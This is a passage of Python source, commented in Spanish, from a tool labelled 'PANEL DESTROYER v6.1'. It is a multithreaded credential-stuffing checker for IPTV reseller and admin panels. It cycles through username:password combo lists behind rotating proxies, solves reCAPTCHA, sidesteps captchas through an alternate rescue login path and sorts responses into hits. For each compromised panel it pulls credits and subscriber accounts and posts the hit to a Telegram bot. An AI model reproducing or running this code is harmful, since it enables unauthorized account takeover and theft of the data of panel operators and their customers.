                    telegram_message = f"""🔰 PANEL DESTROYER v6.1 🔰
{self.current_time}

{hit_message}"""

                    url_telegram = f"https://api.telegram.org/bot{self.telegram_token}/sendMessage"
                    response = requests.post(
                        url_telegram,
                        json={
                            "chat_id": self.telegram_chat_id,
                            "text": telegram_message
                        },
                        verify=False,
                        timeout=10
                    )
                    if response.status_code == 200:
                        logging.info("Hit enviado exitosamente a Telegram")
                except Exception as e:
                    logging.error(f"Error enviando hit a Telegram: {str(e)}")

            return filename

        except Exception as e:
            logging.error(f"Error guardando hit: {str(e)}")
            return None

    def verify_login_success(self, response, username):
        try:

            if response.status_code in [429, 503, 502, 504, 408, 520, 521, 522, 523, 524]:
                logging.warning(f"Status code {response.status_code} - requiere retry")
                return None

            if hasattr(response, 'url'):
                response_url_lower = response.url.lower()

                if 'login.php' not in response_url_lower:
                    success_urls = ['reseller.php', 'dashboard.php', 'admin.php', 'panel.php', 'users.php', 'lines']
                    if any(url in response_url_lower for url in success_urls):
                        logging.info(f"✅ Login exitoso - redirigido a: {response.url}")
                        return True

            if response.status_code == 302:
                location = response.headers.get('Location', '').lower()
                if any(indicator in location for indicator in ['dashboard', 'panel', 'admin', 'reseller']):
                    return True
                elif 'login' in location:
                    return False
                return True

            elif response.status_code == 200:
                response_text = response.text
                response_lower = response_text.lower()

                if response_text.strip().startswith('{') and response_text.strip().endswith('}'):
                    try:
                        json_data = json.loads(response_text)
                        if isinstance(json_data, dict):
                            status = json_data.get('status', '').lower()
                            message = json_data.get('message', '').lower()

                            if status == 'success':
                                logging.info(f"✅ JSON Success detectado: {json_data}")
                                return True
                            elif status in ['error', 'failed', 'fail']:
                                logging.info(f"❌ JSON Error detectado: {json_data}")
                                return False
                            elif 'reseller.php' in message or 'dashboard.php' in message or 'admin.php' in message:
                                logging.info(f"✅ JSON Success con redirección detectada: {message}")
                                return True
                    except json.JSONDecodeError:
                        pass  

                retry_indicators = [
                    "too many times", "try again tomorrow", "please wait",
                    "server busy", "temporary error", "service unavailable",
                    "rate limit", "conexiones máximas", "demasiados intentos",
                    "temporarily blocked", "please try again later",
                    "server overloaded", "maintenance mode", "try again in",
                    "wait before trying"
                ]

                for indicator in retry_indicators:
                    if indicator in response_lower:
                        logging.warning(f"Retry indicator detectado: {indicator}")
                        return None

                custom_indicators = [
                    "you have used an incorrect access code",
                    "incorrect access code",
                    "contact your administrator",
                    "access code invalid",
                    "código de acceso incorrecto",
                    "contacte al administrador"
                ]

                for custom_indicator in custom_indicators:
                    if custom_indicator in response_lower:
                        return "custom"

                error_indicators = [
                    "please try again", "your account has been disabled",
                    "incorrect username or password", "invalid credentials",
                    "access denied", "wrong username", "wrong password",
                    "authentication failed", "login failed", "invalid username",
                    "invalid password", "usuario o contraseña incorrectos",
                    "credenciales incorrectas", "error de autenticación",
                    "login incorrecto", "usuario inválido", "contraseña inválida",
                    "acceso denegado", "authentication error", "login error",
                    "bad credentials", "invalid login", "failed to authenticate"
                ]

                for error in error_indicators:
                    if error in response_lower:
                        logging.info(f"Error definitivo detectado: {error}")
                        return False

                strong_success_indicators = [
                    'logout.php', 'dashboard.php', 'reseller.php',
                    'admin.php', 'panel.php', 'users.php',
                    f'welcome {username}', f'bienvenido {username}',
                    'user profile', 'perfil de usuario'
                ]

                strong_success_count = 0
                for indicator in strong_success_indicators:
                    if indicator in response_lower:
                        strong_success_count += 1
                        logging.info(f"Indicador fuerte de éxito: {indicator}")

                if strong_success_count >= 1:
                    return True

                weak_success_indicators = [
                    'dashboard', 'reseller', 'admin', 'welcome', 'bienvenido',
                    'credits', 'créditos', 'accounts', 'cuentas',
                    'users', 'usuarios', 'lines', 'líneas',
                    'control panel', 'panel de control'
                ]

                weak_success_count = 0
                found_weak_indicators = []
                for indicator in weak_success_indicators:
                    if indicator in response_lower:
                        weak_success_count += 1
                        found_weak_indicators.append(indicator)

                if weak_success_count >= 3:
                    if not any(error_phrase in response_lower for error_phrase in [
                        'error', 'failed', 'invalid', 'incorrect', 'denied'
                    ]):
                        if len(response_text) > 1000:
                            logging.info(f"Éxito por indicadores débiles: {found_weak_indicators}")
                            return True

                if len(response_text) < 500:
                    logging.info("Respuesta muy corta - probablemente error")
                    return False

                if '<form' in response_text and any(field in response_lower for field in ['username', 'password', 'usuario', 'contraseña']):
                    logging.info("Formulario de login detectado - no es éxito")
                    return False

                logging.info("Sin indicadores claros de éxito - marcando como fallo")
                return False
            else:
                logging.warning(f"Status code no manejado {response.status_code} - retry")
                return None

        except Exception as e:
            logging.error(f"Error en verify_login_success: {e}")
            return None

    def update_progress(self):
        try:
            if self.stats['total'] > 0:
                progress = min(100, (self.stats['checked'] / self.stats['total']) * 100)
                self.progress_percentage = progress

            if self.start_time:
                elapsed_time = time.time() - self.start_time
                if elapsed_time > 0:
                    self.cpm = int(self.stats['checked'] * 60 / elapsed_time)
                else:
                    self.cpm = 0

        except Exception as e:
            logging.error(f"Error updating progress: {str(e)}")
            self.progress_percentage = 0
            self.cpm = 0

    def requeue_combo(self, combo, server_url=None):
        """Reintroduce un combo a la cola de trabajo"""
        try:
            if not self.scanning_complete and hasattr(self, 'work_queue'):
                url_to_use = server_url if server_url else self.server_url
                self.work_queue.put((url_to_use, combo))
                logging.info(f"Combo {combo} reintroducido a la cola para {url_to_use}")

        except Exception as e:
            logging.error(f"Error reintroduciendo combo {combo}: {str(e)}")

    def process_combo(self, combo):
        try:
            username, password = combo.split(':')
            username = username.strip()
            password = password.strip()

            scan_url = self.server_url

            extractor = AccountExtractor(
                url=scan_url,
                username=username,
                password=password,
                verify_accounts=False,
                thread_id=None,
                proxy_manager=self.proxy_manager if hasattr(self, 'proxy_manager') else None,
                verbose=False,
                proxy_url=self.flaresolverr_proxy_url if hasattr(self, 'flaresolverr_proxy_url') else None
            )

            login_success = extractor.login()

            if login_success is None:

                with self.thread_lock:
                    self.retry_accounts[combo] = self.retry_accounts.get(combo, 0) + 1

                    if self.retry_accounts[combo] >= self.max_retries:
                        self.fail += 1
                        print(f"{Fore.RED}❌ Máximo de reintentos ({self.max_retries}) alcanzado para {username}{Style.RESET_ALL}")
                    else:
                        self.retries += 1  
                        print(f"{Fore.YELLOW}⚠️ Retry {self.retry_accounts[combo]}/{self.max_retries} para {username} - reintroduciendo a cola{Style.RESET_ALL}")

                        self.requeue_combo(combo, server_url=scan_url)
                return False
            elif login_success == False:

                with self.thread_lock:
                    self.fail += 1
                return False

            with self.thread_lock:
                if combo in self.retry_accounts:
                    del self.retry_accounts[combo]

                self.hit += 1

            logging.info(f"🎯 Hit encontrado para {username}")

            if not extractor.host_m3u or extractor.host_m3u == "N/D":
                try:
                    extractor.get_host_m3u_sync()
                    logging.info(f"✅ Host M3U obtenido: {extractor.host_m3u}")
                except Exception as e:
                    logging.warning(f"⚠️ No se pudo obtener host M3U: {e}")

            panel_info = None
            max_dashboard_retries = 3
            for retry_attempt in range(max_dashboard_retries):
                panel_info = self.get_dashboard_info_from_extractor(extractor, username, password)

                has_valid_data = False
                if panel_info:

                    valid_fields = ['credits', 'active_cons', 'open_connections', 'online_users']
                    for field in valid_fields:
                        value = panel_info.get(field, 'N/D')
                        if value not in ['N/D', 'N/A', None, '']:
                            has_valid_data = True
                            break

                if has_valid_data:
                    logging.info(f"✅ Datos del dashboard obtenidos correctamente en intento {retry_attempt + 1}")
                    break
                else:
                    if retry_attempt < max_dashboard_retries - 1:
                        logging.warning(f"⚠️ No se obtuvieron datos del dashboard, reintentando ({retry_attempt + 1}/{max_dashboard_retries})...")
                        time.sleep(2)  
                    else:
                        logging.warning(f"⚠️ No se pudieron obtener datos del dashboard después de {max_dashboard_retries} intentos")

            if not panel_info:
                panel_info = {
                    'expires': 'N/D',
                    'active_cons': 'N/D',
                    'max_cons': 'N/D',
                    'reseller_dns': 'N/D',
                    'server_info': 'N/D',
                    'credits': 'N/D',
                    'open_connections': 'N/D',
                    'online_users': 'N/D'
                }

            self.save_hit(
                extractor.original_url,  
                username,
                password,
                extractor.panel_type,
                extractor.admin,
                panel_info.get('expires', 'N/D'),
                panel_info.get('active_cons', 'N/D'),
                panel_info.get('max_cons', 'N/D'),
                panel_info.get('reseller_dns', 'N/D'),
                panel_info.get('server_info', 'N/D'),
                panel_info.get('credits', 'N/D'),
                panel_info.get('open_connections', 'N/D'),
                panel_info.get('online_users', 'N/D'),
                extractor.host_m3u if hasattr(extractor, 'host_m3u') and extractor.host_m3u else "N/D"
            )

            with self.tracking_lock:
                hit_data = {
                    'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    'host': scan_url,
                    'username': username,
                    'password': password,
                    'panel_type': extractor.panel_type,
                    'is_admin': 'YES' if extractor.admin == "SI" else 'NO',
                    'credits': panel_info.get('credits', 'N/D'),
                    'active_accounts': panel_info.get('active_cons', 'N/D'),
                    'open_connections': panel_info.get('open_connections', 'N/D'),
                    'online_users': panel_info.get('online_users', 'N/D')
                }
                self.reseller_hits.append(hit_data)

            def extract_in_background():
                """Extrae cuentas en un hilo separado para evitar congelamiento"""
                try:
                    print(f"{Fore.CYAN}🔍 [Hilo] Intentando extraer cuentas de {username}...{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}📋 [Hilo] Panel detectado: {extractor.panel_type}{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}📋 [Hilo] Base URL: {extractor.base_url}{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}📋 [Hilo] Es admin: {extractor.admin}{Style.RESET_ALL}")

                    extracted_accounts = extractor.extract_accounts()
                    print(f"{Fore.CYAN}📊 [Hilo] Cuentas extraídas: {len(extracted_accounts) if extracted_accounts else 0}{Style.RESET_ALL}")

                    if extracted_accounts is None:
                        print(f"{Fore.YELLOW}⚠️ [Hilo] extract_accounts() retornó None{Style.RESET_ALL}")

                    if extracted_accounts and len(extracted_accounts) > 0:
                        print(f"{Fore.CYAN}📊 [Hilo] Procesando {len(extracted_accounts)} cuentas extraídas de {username}...{Style.RESET_ALL}")

                        with self.tracking_lock:
                            for account in extracted_accounts:
                                account_data = {
                                    'reseller': username,
                                    'username': account.get('username', 'N/A'),
                                    'expires': account.get('expires', 'N/A'),
                                    'status': account.get('status', 'N/A'),
                                    'active_cons': account.get('active_cons', '0'),
                                    'max_cons': account.get('max_cons', '1')
                                }
                                self.extracted_accounts.append(account_data)

                        print(f"{Fore.GREEN}📋 [Hilo] Total en tabla de cuentas: {len(self.extracted_accounts)}{Style.RESET_ALL}")

                        extractor.save_accounts(extracted_accounts, username, password)
                        print(f"{Fore.GREEN}✅ [Hilo] {len(extracted_accounts)} cuentas extraídas y guardadas{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.YELLOW}⚠️ [Hilo] No se extrajeron cuentas de {username}{Style.RESET_ALL}")

                except Exception as e:
                    error_msg = f"❌ [Hilo] ERROR CRÍTICO extrayendo cuentas de {username}: {str(e)}"
                    print(f"{Fore.RED}{error_msg}{Style.RESET_ALL}")
                    logging.error(f"No se pudieron extraer cuentas para {username}: {str(e)}")

                    import traceback
                    traceback_str = traceback.format_exc()
                    logging.error(f"Traceback completo:\n{traceback_str}")

                    try:
                        with open('extraction_error_debug.txt', 'a', encoding='utf-8') as f:
                            f.write(f"\n{'='*80}\n")
                            f.write(f"Error extrayendo cuentas - {datetime.now()}\n")
                            f.write(f"Usuario: {username}\n")
                            f.write(f"Error: {str(e)}\n")
                            f.write(f"\nTraceback:\n{traceback_str}\n")
                    except:
                        pass

                    print(f"{Fore.YELLOW}⚠️ [Hilo] Error guardado en extraction_error_debug.txt{Style.RESET_ALL}")

            extraction_thread = threading.Thread(target=extract_in_background, daemon=True)
            extraction_thread.start()
            print(f"{Fore.GREEN}🚀 Extracción de cuentas iniciada en hilo separado (no bloqueante){Style.RESET_ALL}")  

            return True

        except Exception as e:
            logging.error(f"Error procesando combo {combo}: {str(e)}")
            return False

    def get_dashboard_info_from_extractor(self, extractor, username, password):
        """Obtiene información del dashboard después del login"""
        try:
            panel_info = {
                'expires': 'N/D',
                'active_cons': 'N/D',
                'max_cons': 'N/D',
                'reseller_dns': 'N/D',
                'server_info': 'N/D',
                'credits': 'N/D',
                'open_connections': 'N/D',
                'online_users': 'N/D'
            }

            if hasattr(extractor, 'reseller_info') and extractor.reseller_info:
                reseller_info = extractor.reseller_info
                credits = reseller_info.get('credits', 'N/D')
                active_accounts = reseller_info.get('active_accounts', 'N/D')
                open_connections = reseller_info.get('open_connections', 'N/D')
                online_users = reseller_info.get('online_users', 'N/D')

                if credits not in ['N/D', 'N/A'] or active_accounts not in ['N/D', 'N/A']:
                    panel_info['credits'] = credits
                    panel_info['active_cons'] = active_accounts
                    panel_info['open_connections'] = open_connections
                    panel_info['online_users'] = online_users
                    logging.info(f"✅ Datos obtenidos del reseller_info - Créditos: {credits}, Cuentas: {active_accounts}, Conexiones: {open_connections}, Online: {online_users}")
                    return panel_info

            if extractor.panel_type == "XC":
                if extractor.admin:
                    api_endpoints = [f"{extractor.base_url}/api.php?action=admin_dashboard"]
                else:
                    api_endpoints = [f"{extractor.base_url}/api.php?action=reseller_dashboard"]
            else:  
                api_endpoints = [f"{extractor.base_url}/api?action=dashboard"]

            for api_url in api_endpoints:
                try:
                    headers = {
                        'X-Requested-With': 'XMLHttpRequest',
                        'Accept': 'application/json, text/javascript, */*; q=0.01'
                    }

                    response = extractor.make_request_with_retry(
                        'GET',
                        api_url,
                        timeout=(10, 20),
                        max_retries=2,
                        verify=False,
                        allow_redirects=True,
                        headers=headers
                    )

                    if response and response.status_code == 200:

                        try:
                            data = response.json()

                            panel_info['credits'] = str(data.get('credits', data.get('credit', 'N/D')))
                            panel_info['open_connections'] = str(data.get('open_connections', 'N/D'))
                            panel_info['online_users'] = str(data.get('online_users', 'N/D'))

                            if extractor.admin:
                                panel_info['active_cons'] = str(data.get('active_accounts', data.get('total_users', 'N/D')))
                                panel_info['server_info'] = str(data.get('server_status', 'Online' if data.get('total_users') else 'N/D'))
                            else:

                                panel_info['active_cons'] = str(data.get('active_accounts', 'N/D'))
                                panel_info['max_cons'] = str(data.get('max_connections', 'N/D'))

                            logging.info(f"✅ Datos del dashboard obtenidos desde {api_url}")
                            return panel_info

                        except json.JSONDecodeError:

                            if len(response.text) > 500:
                                logging.info(f"Dashboard HTML obtenido desde {api_url}, pero no se pudo parsear")
                                pass

                except Exception as e:
                    logging.debug(f"Error obteniendo dashboard de {api_url}: {str(e)}")
                    continue

            logging.warning(f"No se pudieron obtener datos del dashboard para {username}")
            return panel_info

        except Exception as e:
            logging.error(f"Error en get_dashboard_info_from_extractor: {str(e)}")
            return {
                'expires': 'N/D',
                'active_cons': 'N/D',
                'max_cons': 'N/D',
                'reseller_dns': 'N/D',
                'server_info': 'N/D',
                'credits': 'N/D'
            }

    def process_combo_old(self, combo):
        """Método antiguo de process_combo - guardado por si acaso"""
        try:
            username, password = combo.split(':')
            username = username.strip()
            password = password.strip()

            scan_url = self.server_url
            max_retries = 3
            retry_count = 0

            while retry_count < max_retries:
                proxy = None
                if self.proxy_manager and self.proxy_manager.useProxies:
                    proxy, _ = self.proxy_manager.getProxy()

                initial_response = self.make_request(
                    'get',
                    scan_url,
                    proxy=proxy,
                    timeout=5
                )

                if not initial_response:

                    logging.warning(f"Intentando fallback para servidor problemático: {scan_url}")
                    initial_response = self.make_request_fallback('get', scan_url, timeout=10)

                    if not initial_response:
                        retry_count += 1
                        if proxy:
                            self.proxy_manager.recycle_proxy(proxy)
                        continue

                cookies = initial_response.cookies
                phpsessid = cookies.get('PHPSESSID')

                if not phpsessid:
                    retry_count += 1
                    continue

                captcha_sitekey = self.detect_recaptcha(initial_response.text)
                captcha_response = None

                if captcha_sitekey and isinstance(captcha_sitekey, str):
                    captcha_response = self.solve_recaptcha(captcha_sitekey, scan_url)
                    if not captcha_response:
                        retry_count += 1
                        continue

                login_data = {
                    'referrer': '',
                    'username': username,
                    'password': password,
                    'login': ''
                }

                if captcha_response:
                    login_data['g-recaptcha-response'] = captcha_response

                login_response = self.make_request(
                    'post',
                    scan_url,
                    data=login_data,
                    proxy=proxy,
                    cookies={'PHPSESSID': phpsessid},
                    timeout=5,
                    allow_redirects=True  
                )

                if not login_response:
                    retry_count += 1
                    continue

                verify_result = self.verify_login_success(login_response, username)

                if verify_result is None:  
                    retry_count += 1

                    with self.thread_lock:
                        current_attempts = self.retry_accounts.get(combo, 0) + 1
                        self.retry_accounts[combo] = current_attempts

                        if current_attempts < 3:  

                            threading.Timer(5.0, self.requeue_combo, args=[combo]).start()
                            self.retries += 1
                            logging.warning(f"Retry {current_attempts}/3 para {combo}")
                            return False
                        else:
                            logging.error(f"Combo {combo} descartado tras {current_attempts} intentos")
                            if combo in self.retry_accounts:
                                del self.retry_accounts[combo]
                            return False

                    if proxy:
                        self.proxy_manager.recycle_proxy(proxy)
                    time.sleep(2)  
                    continue

                if verify_result == "custom":
                    logging.info(f"🔄 Custom detectado para {username}")

                    with self.thread_lock:
                        self.custom += 1

                    verification_url = self.original_url if hasattr(self, 'original_url') and self.original_url else scan_url

                    logging.info(f"Verificando custom {username} con URL original: {verification_url}")
                    print(f"{Fore.YELLOW}🔍 Custom {username} - verificando con URL original...{Style.RESET_ALL}")

                    hit_success = self.verify_custom_as_hit(username, password, verification_url)

                    if hit_success:
                        with self.thread_lock:
                            self.hit += 1
                            if self.custom > 0:
                                self.custom -= 1

                            if combo in self.retry_accounts:
                                del self.retry_accounts[combo]

                        logging.info(f"✅ Custom convertido a hit: {username}")
                        print(f"{Fore.GREEN}✅ Custom {username} convertido a HIT!{Style.RESET_ALL}")
                        return True
                    else:
                        logging.info(f"❌ Custom sigue siendo custom: {username}")
                        print(f"{Fore.YELLOW}⚠️ Custom {username} verificado - sigue siendo custom{Style.RESET_ALL}")

                        if not (hasattr(self, 'use_rescue_strategy') and self.use_rescue_strategy):
                            self.save_custom_hit(verification_url, username, password)
                        else:
                            logging.info(f"Custom de rescue verificado completamente - no guardar archivo duplicado")

                    return False

                if verify_result:
                    with self.thread_lock:

                        if combo in self.retry_accounts:
                            del self.retry_accounts[combo]

                    logging.info(f"🎯 Hit encontrado para {username}")
                    print(f"{Fore.GREEN}🎯 Hit encontrado: {username}{Style.RESET_ALL}")

                    if hasattr(self, 'use_rescue_strategy') and self.use_rescue_strategy:
                        logging.info(f"Hit en rescue - procesando con URL original para datos completos")
                        print(f"{Fore.CYAN}🔄 Hit - obteniendo datos completos...{Style.RESET_ALL}")

                        success = self.process_hit_from_rescue(username, password, login_response, phpsessid)
                    else:
                        success = self.process_successful_login(
                            login_response,
                            username,
                            password,
                            phpsessid,
                            scan_url
                        )

                    if success:
                        with self.thread_lock:
                            self.hit += 1

                        print(f"{Fore.GREEN}✅ Hit procesado exitosamente: {username}{Style.RESET_ALL}")

                        extraction_url = self.original_url if hasattr(self, 'original_url') and self.original_url else scan_url

                        def extract_async():
                            try:
                                print(f"{Fore.CYAN}🔄 [Fondo] Extrayendo cuentas de {username}...{Style.RESET_ALL}")
                                accounts, accounts_file = self.extract_accounts_from_hit(username, password, extraction_url)

                                if accounts:
                                    print(f"{Fore.GREEN}🎉 [Fondo] {len(accounts)} cuentas extraídas de {username}!{Style.RESET_ALL}")
                                    if accounts_file:
                                        print(f"{Fore.GREEN}📁 [Fondo] Guardado: {os.path.basename(accounts_file)}{Style.RESET_ALL}")

                                    if hasattr(self, 'successful_results') and not self.successful_results.empty():
                                        try:
                                            hits_list = list(self.successful_results.queue)
                                            for hit_info in hits_list:
                                                if username in hit_info.get('message', ''):
                                                    hit_info['message'] += f"\n🎉 Cuentas extraídas: {len(accounts)}"
                                                    if accounts_file:
                                                        hit_info['message'] += f"\n📁 Archivo: {os.path.basename(accounts_file)}"
                                                    hit_info['accounts'] = accounts
                                                    break
                                        except:
                                            pass
                                else:
                                    print(f"{Fore.YELLOW}⚠️ [Fondo] Sin cuentas para {username}{Style.RESET_ALL}")

                            except Exception as e:
                                print(f"{Fore.RED}❌ [Fondo] Error extrayendo {username}: {str(e)}{Style.RESET_ALL}")

                        extraction_thread = threading.Thread(target=extract_async, daemon=True)
                        extraction_thread.start()

                        return True

                with self.thread_lock:
                    self.fail += 1
                return False

            with self.thread_lock:
                self.retries += 1
                current_attempts = self.retry_accounts.get(combo, 0) + 1
                self.retry_accounts[combo] = current_attempts

                if current_attempts < 3:

                    threading.Timer(10.0, self.requeue_combo, args=[combo]).start()
                    logging.warning(f"Último retry {current_attempts}/3 para {combo}")
                else:
                    logging.error(f"Combo {combo} definitivamente descartado")
                    if combo in self.retry_accounts:
                        del self.retry_accounts[combo]

            return False

        except Exception as e:
            logging.error(f"Error procesando combo {combo}: {str(e)}")
            print(f"{Fore.RED}❌ Error procesando {combo}: {str(e)}{Style.RESET_ALL}")
            with self.thread_lock:
                self.retries += 1
            return False

    def monitor_progress(self):
        try:
            while not self.scanning_complete:
                if self.start_time:
                    elapsed_time = time.time() - self.start_time
                    if elapsed_time > 0:
                        self.cpm = int(self.stats['checked'] * 60 / elapsed_time)
                    else:
                        self.cpm = 0

                    if self.stats['total'] > 0:
                        self.progress_percentage = (self.stats['checked'] / self.stats['total']) * 100

                    self.update_display()

                time.sleep(0.5)
        except Exception as e:
            logging.error(f"Error en monitor_progress: {str(e)}")

    def scan_multiple(self, combo_file, start_pos, thread_count):
        try:
            with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
                combos = f.readlines()[start_pos:]

            self.stats['total'] = len(combos)
            print(f"\n{Fore.CYAN}Iniciando escaneo con {thread_count} threads")
            print(f"Total de combos a procesar: {self.stats['total']}{Style.RESET_ALL}\n")

            self.work_queue = Queue()

            for combo in combos:
                if combo.strip():
                    self.work_queue.put((self.server_url, combo.strip()))

            threads = []
            self.scanning_complete = False
            self.active_threads = thread_count 

            for i in range(thread_count):
                t = threading.Thread(
                    target=self.scan_worker,
                    args=(i + 1,),
                    daemon=True
                )
                threads.append(t)
                t.start()

            progress_thread = threading.Thread(target=self.monitor_progress, daemon=True)
            progress_thread.start()

            self.work_queue.join()

            self.scanning_complete = True
            for t in threads:
                if t.is_alive():
                    t.join(timeout=2)

        except Exception as e:
            logging.error(f"Error en scan_multiple: {str(e)}")
            print(f"{Fore.RED}Error durante el escaneo: {str(e)}{Style.RESET_ALL}")

    def scan_worker(self, thread_id):
        logging.info(f"Worker {thread_id} iniciado")

        while not self.scanning_complete:
            try:
                try:
                    current_url, combo = self.work_queue.get(timeout=1)
                    logging.info(f"Worker {thread_id} procesando: {combo}")
                except queue.Empty:
                    continue

                with self.thread_lock:
                    self.current_server = current_url
                    self.current_combo = combo

                success = self.process_combo(combo)

                with self.thread_lock:
                    self.stats['checked'] += 1
                    logging.info(f"Worker {thread_id} completó {combo} - Success: {success} - Checked: {self.stats['checked']}/{self.stats['total']}")

                self.work_queue.task_done()

            except Exception as e:
                logging.error(f"Error en worker {thread_id}: {str(e)}")
                try:
                    self.work_queue.task_done()
                except:
                    pass
                continue

        with self.thread_lock:
            self.active_threads -= 1

        logging.info(f"Worker {thread_id} terminado")

    def scan_multiple_servers(self, combo_file, start_pos, thread_count, urls):
        """Escanea múltiples servidores - IMPLEMENTACIÓN OPTIMIZADA"""
        try:

            with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
                combos = [line.strip() for line in f.readlines()[start_pos:] if line.strip()]

            total_combos = len(combos)
            total_tasks = total_combos * len(urls)

            self.stats['total'] = total_tasks
            print(f"\n{Fore.CYAN}🚀 Iniciando escaneo múltiple:")
            print(f"📊 URLs: {len(urls)}")
            print(f"🎯 Combos: {total_combos}")
            print(f"⚡ Total tareas: {total_tasks}")
            print(f"🤖 Threads: {thread_count}{Style.RESET_ALL}")

            self.work_queue = Queue()
            for url in urls:
                for combo in combos:
                    self.work_queue.put((url, combo))

            print(f"{Fore.GREEN}✅ Cola creada: {self.work_queue.qsize()} tareas{Style.RESET_ALL}")

            threads = []
            self.scanning_complete = False
            self.active_threads = thread_count

            for i in range(thread_count):
                t = threading.Thread(
                    target=self.scan_worker_multi,
                    args=(i + 1,),
                    daemon=True
                )
                threads.append(t)
                t.start()

            progress_thread = threading.Thread(target=self.monitor_progress, daemon=True)
            progress_thread.start()

            self.work_queue.join()
            self.scanning_complete = True

            for t in threads:
                if t.is_alive():
                    t.join(timeout=2)

            print(f"\n{Fore.GREEN}🎉 Escaneo múltiple completado!{Style.RESET_ALL}")

        except Exception as e:
            logging.error(f"Error en scan_multiple_servers: {str(e)}")
            print(f"{Fore.RED}❌ Error durante escaneo múltiple: {str(e)}{Style.RESET_ALL}")

    def scan_worker_multi(self, thread_id):
        """Worker optimizado para múltiples URLs"""
        while not self.scanning_complete:
            try:

                try:
                    current_url, combo = self.work_queue.get(timeout=1)
                except queue.Empty:
                    continue

                with self.thread_lock:
                    self.current_server = current_url
                    self.current_combo = combo

                final_url, use_rescue, original_url = self.quick_validate_server(current_url)

                if not final_url:
                    with self.thread_lock:
                        self.stats['checked'] += 1
                    self.work_queue.task_done()
                    continue

                old_server = self.server_url
                old_rescue = getattr(self, 'use_rescue_strategy', False)
                old_original = getattr(self, 'original_url', None)

                self.server_url = final_url
                self.use_rescue_strategy = use_rescue
                self.original_url = original_url if original_url else final_url

                success = self.process_combo(combo)

                self.server_url = old_server
                self.use_rescue_strategy = old_rescue
                self.original_url = old_original

                with self.thread_lock:
                    self.stats['checked'] += 1

                self.work_queue.task_done()

            except Exception as e:
                logging.error(f"Error en multi-worker {thread_id}: {str(e)}")
                try:
                    self.work_queue.task_done()
                except:
                    pass

        with self.thread_lock:
            self.active_threads -= 1

    def quick_validate_server(self, url):
        """Validación ultra-rápida para múltiples servidores"""
        try:

            response = self.make_request('get', url, timeout=5)

            if not response or response.status_code != 200:
                return None, False, None

            has_recaptcha = self.detect_recaptcha(response.text)

            if not has_recaptcha:
                return url, False, None

            parsed = urlparse(url)
            rescue_url = f"{parsed.scheme}://{parsed.netloc}/rescue/login"

            rescue_response = self.make_request('get', rescue_url, timeout=3)
            if (rescue_response and 
                rescue_response.status_code == 200 and 
                not self.detect_recaptcha(rescue_response.text)):
                return rescue_url, True, url

            return url, False, None

        except Exception as e:
            logging.error(f"Error validación rápida {url}: {str(e)}")
            return None, False, None

    def configure_proxies(self, auto_detect=True):
        """Configuración mejorada con soporte para proxies con autenticación"""
        print(f"\n{Fore.CYAN}Configuración de Proxies{Style.RESET_ALL}")

        if auto_detect and hasattr(self, 'server_url') and self.server_url:
            server_config = get_server_config(self.server_url)
            if server_config.get('use_proxies'):
                print(f"{Fore.YELLOW}⚠️ Este servidor REQUIERE proxies según configuración{Style.RESET_ALL}")
                print(f"{Fore.CYAN}📋 Razón: {server_config.get('description', 'Protección de servidor')}{Style.RESET_ALL}")
                choice = 's'  
            else:
                while True:
                    choice = input(f"{Fore.GREEN}¿Desea usar proxies? (s/n): {Style.RESET_ALL}").lower()
                    if choice not in ['s', 'n']:
                        print(f"{Fore.RED}Por favor responda 's' o 'n'{Style.RESET_ALL}")
                        continue
                    break
        else:
            while True:
                choice = input(f"{Fore.GREEN}¿Desea usar proxies? (s/n): {Style.RESET_ALL}").lower()
                if choice not in ['s', 'n']:
                    print(f"{Fore.RED}Por favor responda 's' o 'n'{Style.RESET_ALL}")
                    continue
                break

        if choice == 'n':
            self.proxy_manager.useProxies = False
            return False

        proxy_files = []
        if os.path.exists('Proxies'):
            proxy_files = [f for f in os.listdir('Proxies') if f.endswith('.txt')]

        if not proxy_files:
            print(f"{Fore.RED}No se encontraron archivos de proxies en la carpeta Proxies{Style.RESET_ALL}")
            return False

        print(f"\n{Fore.CYAN}Archivos de proxies disponibles:{Style.RESET_ALL}")
        for i, file in enumerate(proxy_files, 1):
            file_path = os.path.join('Proxies', file)

            try:
                with open(file_path, 'r') as f:
                    sample_lines = [line.strip() for line in f.readlines()[:5] if line.strip()]

                has_auth = any(len(line.split(':')) == 4 for line in sample_lines)
                format_info = "con autenticación" if has_auth else "simple"

                print(f"{Fore.YELLOW}[{i}] {file} ({format_info}){Style.RESET_ALL}")
            except:
                print(f"{Fore.YELLOW}[{i}] {file}{Style.RESET_ALL}")

        while True:
            try:
                file_choice = int(input(f"\n{Fore.GREEN}Seleccione número de archivo de proxies: {Style.RESET_ALL}"))
                if not (1 <= file_choice <= len(proxy_files)):
                    print(f"{Fore.RED}Selección inválida{Style.RESET_ALL}")
                    continue
                break
            except ValueError:
                print(f"{Fore.RED}Por favor ingrese un número válido{Style.RESET_ALL}")
                continue

        proxy_file = os.path.join('Proxies', proxy_files[file_choice-1])

        try:
            with open(proxy_file, 'r') as f:
                sample_lines = [line.strip() for line in f.readlines()[:10] if line.strip()]

            has_auth_format = any(len(line.split(':')) == 4 for line in sample_lines)

            print(f"\n{Fore.CYAN}Tipos de proxy disponibles:{Style.RESET_ALL}")
            if has_auth_format:
                print(f"{Fore.GREEN}✅ Formato con autenticación detectado automáticamente{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[1] HTTP con autenticación")
                print(f"[2] SOCKS5 con autenticación")
                print(f"[3] SOCKS4 con autenticación{Style.RESET_ALL}")

                proxy_type = input(f"\n{Fore.GREEN}Seleccione tipo de proxy (1-3): {Style.RESET_ALL}")

                if not hasattr(self.proxy_manager, 'HTTP_AUTH'):
                    self.proxy_manager.HTTP_AUTH = 5

                type_map = {
                    '1': self.proxy_manager.HTTP_AUTH,
                    '2': self.proxy_manager.SOCKS5,
                    '3': self.proxy_manager.SOCKS4
                }
            else:
                print(f"{Fore.BLUE}ℹ️ Formato simple detectado{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[1] HTTP")
                print(f"[2] SOCKS4")
                print(f"[3] SOCKS5{Style.RESET_ALL}")

